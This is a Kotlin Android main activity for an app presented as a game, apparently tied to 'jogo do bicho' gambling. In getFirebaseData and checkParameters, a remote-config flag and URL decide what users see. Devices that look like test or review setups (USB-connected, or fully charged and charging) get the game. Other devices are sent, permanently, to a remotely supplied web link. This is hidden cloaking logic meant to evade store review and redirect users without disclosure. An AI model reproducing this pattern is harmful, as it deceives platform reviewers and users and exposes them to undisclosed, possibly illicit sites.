package jogo.dobicho.games

import android.content.pm.ActivityInfo
import android.net.Uri
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.firebase.FirebaseApp
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import jogo.dobicho.games.databinding.ActivityMainBinding
import jogo.dobicho.games.game.actors.tiles6_Remote
import jogo.dobicho.games.game.utils.Layout
import jogo.dobicho.games.util.DataStoreManager
import jogo.dobicho.games.util.Lottie
import jogo.dobicho.games.util.Once
import jogo.dobicho.games.util.getBatteryPercentage
import jogo.dobicho.games.util.internetConnection
import jogo.dobicho.games.util.isBatteryCharging
import jogo.dobicho.games.util.isUSB
import jogo.dobicho.games.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import kotlin.system.exitProcess

var f = true
class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val Wdc = 146
        var URL_Wdc = "https://stackoverflow.com/"

        val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie          : Lottie

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkDataStore()
//            startFragmentID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                startFragmentID.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        Wdc                 -> {
                            val intent = CustomTabsIntent.Builder().build()
                            intent.launchUrl(this@MainActivity, Uri.parse(URL_Wdc))
                        }
                    }
                }
            }
        }
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Wdc" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        URL_Wdc = it
                        startFragmentID.emit(Wdc)
                    }
                }
                "Igrula" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getFirebaseData()
                }
            }
        }
    }

    private fun getFirebaseData() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                if (task.isSuccessful) {
                    val jsonData = getString("Shoe")
                    log("success = $jsonData")
                    JSONObject(jsonData).also { jsonObj ->
                        val occur = jsonObj.getBoolean("occur")
                        val road  = jsonObj.getString("road")

                        tiles6_Remote = mutableListOf()

                        repeat(16) {
                            val layoutData = Layout.LayoutData()
                            jsonObj.getJSONArray("i${it.inc()}").also { iN ->
                                repeat(4) { iIndex ->
                                    when(iIndex) {
                                        0 -> layoutData.x = iN.getInt(iIndex).toFloat()
                                        1 -> layoutData.y = iN.getInt(iIndex).toFloat()
                                        2 -> layoutData.w = iN.getInt(iIndex).toFloat()
                                        3 -> layoutData.h = iN.getInt(iIndex).toFloat()
                                    }

                                }
                            }
                            tiles6_Remote?.add(layoutData)
                        }

                        log("trr = $tiles6_Remote")

                        log("occur: $occur | road: $road")
                        checkParameters(occur, road)
                    }
                } else {
                    startFragmentID.tryEmit(R.id.libGDXFragment)
                    log("getFirebaseData Fail = ${this.all}")
                }
            }
        }
    }

    private fun checkParameters(occur: Boolean, road: String) {
        fun openAndSaveGame() {
            coroutine.launch(Dispatchers.IO) {
                DataStoreManager.Key.update { "Igrula" }
                startFragmentID.tryEmit(R.id.libGDXFragment)
            }
        }

        if (occur) {
            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) openAndSaveGame()
            else openAndSaveInterpol(road)
        } else openAndSaveGame()
    }

    private fun openAndSaveInterpol(be: String) {
        URL_Wdc = be

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Wdc" }
            DataStoreManager.Link.update { URL_Wdc }
            startFragmentID.tryEmit(Wdc)
        }
    }

}